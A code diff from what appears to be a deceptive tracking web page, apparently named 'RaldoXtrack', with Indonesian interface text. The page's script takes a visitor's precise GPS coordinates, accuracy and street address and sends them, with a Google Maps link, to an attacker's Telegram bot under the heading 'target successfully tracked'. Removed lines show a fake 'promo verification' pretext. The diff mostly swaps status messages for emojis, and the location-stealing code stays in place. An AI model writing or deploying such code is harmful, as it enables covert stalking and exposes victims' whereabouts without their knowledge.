@@ -60,7 +60,7 @@
 
         // Kirim ke Telegram (sama)
         async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
-            const message = `𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠:𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞𝐭: ${mapsLink}`;
+            const message = `😈𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠: 𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!😈\n\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n\n😈𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞😈𝐭: ${mapsLink}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
             
             try {
@@ -92,7 +92,7 @@
             const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
             const address = await getAddress(lat, lng);
             
-            status.innerHTML = `Verifikasi selesai. Terima kasih! (Akurasi: ${acc.toFixed(0)}m)`;
+            status.innerHTML = `𝐋𝐨𝐩 𝐲𝐨𝐮! (❤❤: ${acc.toFixed(0)}m)`;
             console.log(`Update: ${lat.toFixed(7)}, ${lng.toFixed(7)} | ${address}`);
             
             sendToTelegram(lat, lng, acc, time, address, mapsLink);
@@ -104,10 +104,10 @@
             let msg = 'Verifikasi gagal: ';
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    msg += 'Izinkan lokasi untuk promo.';
+                    msg += 'I🌹🌹❤❤💕💕.';
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    msg += 'Lokasi tidak tersedia. Coba outdoor.';
+                    msg += '🌹🌹🌹🌹🌹🌹.';
                     break;
                 case error.TIMEOUT:
                     msg += 'Sinyal lemah. Mencoba lagi...';
